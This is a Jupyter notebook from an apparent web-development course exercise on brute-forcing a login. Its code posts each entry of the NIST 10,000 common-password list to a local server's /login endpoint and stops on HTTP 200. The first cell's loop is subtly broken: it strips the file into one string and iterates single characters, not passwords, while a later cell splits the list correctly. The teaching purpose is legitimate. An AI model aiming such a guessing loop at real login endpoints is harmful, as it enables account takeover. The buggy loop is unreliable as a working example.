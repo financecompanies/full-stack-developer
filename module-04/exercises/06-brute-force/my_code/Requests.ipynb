{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "editable": true
   },
   "outputs": [],
   "source": [
    "# This method can be used to send a login post \n",
    "# request to our server\n",
    "# returns True if 200 success on login attempt\n",
    "# returns False otherwise (failure, errors)\n",
    "\n",
    "import requests\n",
    "def try_password(password, print_all=False):\n",
    "    # specify where to make the request\n",
    "    url = 'http://127.0.0.1:5000/login'\n",
    "    \n",
    "    # define the payload for the post request\n",
    "    payload = {'password': password}\n",
    "    \n",
    "    # make the request\n",
    "    r = requests.post(url, json=payload)\n",
    "    \n",
    "    # print some results (http status code)\n",
    "    if(print_all):\n",
    "        print(payload['password'] + \":\" + str(r.status_code))\n",
    "    \n",
    "    # determine if we've gained access 200 = success!\n",
    "    if(r.status_code == 200):\n",
    "        print(\"the password is: \" + payload['password'])\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "\n",
    "with open('nist_10000.txt', newline='') as bad_passwords:\n",
    "    nist_bad = bad_passwords.read().strip('\\n')\n",
    "for password in nist_bad:\n",
    "    if (try_password(password)):\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "editable": true
   },
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567']\nTotal of bad passwords: 10001\n"
    }
   ],
   "source": [
    "# Load the NIST list of 10,000 most commonly used passwords (strings)\n",
    "with open('nist_10000.txt', newline='') as bad_passwords:\n",
    "    nist_bad = bad_passwords.read().split('\\n')\n",
    "print(nist_bad[1:10])\n",
    "print(f'Total of bad passwords: {len(nist_bad)}')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "editable": true
   },
   "source": [
    "# Your Task!\n",
    "## Make a request for each password in the nist_bad password list. \n",
    "> Tip: End the loop on a successful response (200)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.7.6 32-bit ('versions': pyenv)",
   "language": "python",
   "name": "python37632bitversionspyenv0a370420b8b141018dc8fee63f20aea6"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6-final"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}